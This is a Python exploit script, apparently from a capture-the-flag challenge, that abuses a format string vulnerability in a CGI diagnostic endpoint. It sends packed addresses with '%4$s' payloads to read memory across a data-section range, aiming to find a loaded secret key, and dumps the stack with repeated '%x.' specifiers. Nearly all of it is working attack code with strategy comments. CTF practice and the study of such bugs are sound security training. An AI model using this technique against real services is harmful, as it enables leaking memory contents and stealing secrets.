#!/usr/bin/env python3
import urllib.request
import urllib.parse
import struct
import time

BASE = "http://millenium-messenger.hackday.fr:8000"

def send_msg_raw(body_bytes):
    encoded = urllib.parse.quote(body_bytes, safe='')
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body={encoded}"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            data = resp.read()
            return data
    except Exception as e:
        return b""

def send_msg(body):
    encoded = urllib.parse.quote(body, safe='')
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body={encoded}"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            return resp.read().decode('latin-1', errors='replace')
    except Exception as e:
        return f"ERROR: {e}"

def extract_diag(raw):
    try:
        marker = b'DIAG '
        idx = raw.find(marker)
        if idx >= 0:
            return raw[idx+5:].rstrip(b'\r\n')
        return raw
    except:
        return raw

# Understanding the binary layout:
# The key is loaded from /app/data/msn_epoch.key into memory
# The STA command confirms "Key-Status: LOADED"
# We need to find where in memory the key is stored
# 
# Strategy: scan the .data/.bss section of the binary
# From previous: 0x8049530 is a static non-null address always at position 3
# This is likely in the .data section (global variable)
# 
# A 32-bit ELF binary typically has:
# .text: 0x08048000 range (code)
# .data/.bss: higher addresses before stack
# 
# The key is likely stored as a global char array or pointer to heap
# Let's scan from 0x08049000 to 0x0804c000 looking for printable key-like data

print("=== Scanning binary data section for key ===")
found = []

# Wider scan of addresses that could contain the key
for addr in range(0x08049000, 0x0804e000, 4):
    addr_bytes = struct.pack('<I', addr)
    payload = addr_bytes + b'%4$s'
    raw = send_msg_raw(payload)
    content = extract_diag(raw)
    
    # Check if content looks like a key (printable, reasonable length)
    if len(content) >= 8:
        try:
            text = content.decode('ascii')
            # Key-like: all printable ASCII, 8-64 chars
            if all(0x20 <= ord(c) < 0x7f for c in text) and 8 <= len(text) <= 64:
                print(f"0x{addr:08x}: {repr(text)}")
                found.append((addr, text))
        except:
            pass
    time.sleep(0.02)

print()
print(f"=== Found {len(found)} candidates ===")
for addr, text in found:
    print(f"  0x{addr:08x}: {repr(text)}")

# Also try approach: scan large blocks using %x to dump stack/heap
print()
print("=== Try large %x dump to find key-like patterns ===")
# Use many %x to dump the stack 
result = send_msg("%x." * 100)
print(result[:2000])
